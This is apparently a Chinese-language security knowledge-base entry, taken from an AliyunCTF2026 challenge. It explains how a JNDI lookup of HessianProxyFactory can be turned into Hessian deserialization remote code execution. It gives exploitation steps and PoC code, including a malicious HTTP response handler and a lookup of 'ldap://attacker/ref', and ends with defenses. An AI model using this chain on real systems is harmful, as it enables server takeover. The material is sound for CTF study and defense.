---
id: web-java-deser-hessian-proxyfactory-jndi-deserialization
title: HessianProxyFactory 作为 JNDI ObjectFactory：lookup 后调用方法触发二次 Hessian 反序列化
type: scenario
domain: web
path: web/java/deserialization/hessian
technique: hessian-proxyfactory-jndi-pivot
aliases:
- HessianProxyFactory JNDI
- JNDI 转 Hessian 反序列化
- HessianProxy invoke readReply
- AliyunCTF Hessian 链
- ObjectFactory Hessian 利用
severity: critical
confidence: medium
status: verified
created: '2026-11-04'
updated: '2026-11-05'
tags:
- java
- hessian
- jndi
- deserialization
- objectfactory
- proxy
- rce
cve: []
verification:
  verified_by: verifier-V8
  verified_at: '2026-11-05T00:31:53+08:00'
  notes: 已对照原文与图 47-49 核对 HessianProxyFactory 实现 ObjectFactory、getObjectInstance→HessianProxy 动态代理、invoke 出站并 readReply 反序列化、HabF 头；原文来自 AliyunCTF2026，仅给服务端代码与 java-chains 截图，无完整执行截图，confidence medium 合理；PoC 未在本机执行。
---

## 一句话结论

`com.caucho.hessian.client.HessianProxyFactory` 实现了 JNDI 的 `ObjectFactory`；JNDI lookup 到它时会创建指向攻击者 URL 的 `HessianProxy` 动态代理，之后对该代理调用任意方法都会让服务端主动请求该 URL，并把响应按 Hessian 反序列化（`readReply`），从而把一次 JNDI lookup 转成二次 Hessian 反序列化 RCE。

## 原理

- JNDI 的 `ObjectFactory.getObjectInstance` 负责把 `Reference` 转成对象。`HessianProxyFactory` 实现了该接口，`getObjectInstance` 最终调用 `create(api, url, loader)`，内部 `new HessianProxy(url, this, api)` 并 `Proxy.newProxyInstance` 返回动态代理。
- `HessianProxy` 实现 `InvocationHandler`：对代理调用任意方法时进入 `invoke`，`sendRequest` 向构造时设置的 URL 发起 Hessian 请求，然后 `getInputStream` 读取响应。
- 响应首字节为 `H` 时进入 Hessian2 分支，`in.readReply(method.getReturnType())` 对响应体做反序列化。攻击者控制的 HTTP 服务返回 `HabF` 头 + 恶意 Hessian 序列化数据，即可触发反序列化链。
- 因此整条链是：JNDI lookup（诱导容器加载 `HessianProxyFactory` 工厂）→ 得到代理对象 → 目标代码对代理调用任意方法（或攻击者控制的代码路径触发）→ 出站请求攻击者 HTTP → 响应反序列化 → RCE。
- 该手法的价值在于：当目标禁用了常见的 JNDI 工厂/远程类加载，但 classpath 有 Hessian 时，仍可把 JNDI 当作“触发一次出站请求并反序列化响应”的跳板。

## 触发条件

1. 目标存在 JNDI 注入点，且能 lookup 到攻击者控制的 Reference（LDAP/RMI/本地工厂）。
2. 目标 classpath 含 `com.caucho:hessian`，且 `HessianProxyFactory` 可被实例化。
3. 目标可出网访问攻击者的 HTTP 服务（返回 Hessian 响应）。
4. lookup 得到的代理对象之后会被调用任意方法（业务代码/框架对返回值的使用），否则 `invoke` 不会触发。

## 利用步骤

1. 搭建恶意 HTTP 服务，对任意请求返回 `HabF` 头 + 构造好的 Hessian 恶意序列化数据。
2. 准备 JNDI Reference，使其 `ObjectFactory` 指向 `com.caucho.hessian.client.HessianProxyFactory`，并让工厂的 URL 指向攻击者 HTTP。
3. 通过 JNDI 注入点 lookup，目标获得 `HessianProxy` 动态代理。
4. 触发对代理对象的方法调用；`invoke` 向攻击者 HTTP 发起请求。
5. 攻击者返回恶意 Hessian 数据，目标 `readReply` 反序列化，执行 gadget。

## PoC

恶意 HTTP 服务核心（返回 Hessian 响应）：

```java
server.createContext("/hessian", exchange -> {
    byte[] body = buildHessianGadget();          // 任意 Hessian 反序列化 payload
    byte[] header = "HabF".getBytes();
    byte[] payload = new byte[header.length + body.length];
    System.arraycopy(header, 0, payload, 0, header.length);
    System.arraycopy(body, 0, payload, header.length, body.length);
    exchange.sendResponseHeaders(200, payload.length);
    exchange.getResponseBody().write(payload);
});
```

代理触发侧（示意）：

```java
Object obj = ctx.lookup("ldap://attacker/ref");  // 返回 HessianProxyFactory 创建的代理
obj.toString();                                  // 任意方法调用 → HessianProxy.invoke → 出站请求
```

`HessianProxy.invoke` 关键逻辑：

```java
conn = sendRequest(mangleName, args);
is = getInputStream(conn);
int code = is.read();
if (code == 'H') {
    in = _factory.getHessian2Input(is);
    Object value = in.readReply(method.getReturnType());   // 反序列化攻击者响应
}
```

原文将该链作为 AliyunCTF2026 的利用手法，并说明 java-chains 可生成对应 payload；原文未给出完整执行截图，confidence 标 medium。

## 变体与关联

- 若目标不允许出网，该链不可用；改用 JDK-only 或 Groovy 链。
- 也可把响应体换成 `HessianServlet` 格式，适配 `HessianServlet` 入口（java-chains 提供 `openservletHeader` 选项）。
- 与标准 JNDI 远程类加载链的区别：不依赖 `trustURLCodebase`，而是利用 Hessian 自身的反序列化；但仍需 classpath 有 Hessian 且能出网。
- 与 Rome/Spring 链可组合：JNDI Reference 指向 HessianProxyFactory，响应再触发另一条 Hessian 链。

## 检测与防御

- JNDI 注入点做白名单/禁用外部 lookup；限制 `InitialContext.lookup` 的目标。
- Hessian 入口允许列表；禁止反序列化来自非预期 URL 的响应。
- 限制服务端出站 HTTP，尤其对非常规域名/端口；监控 `HessianProxy.invoke` 与 `readReply` 调用。
- 移除不必要的 Hessian client 依赖；升级 Hessian 并关注其安全配置。
- 对 JNDI `ObjectFactory` 做类白名单，拒绝 `com.caucho.hessian.client.HessianProxyFactory`。
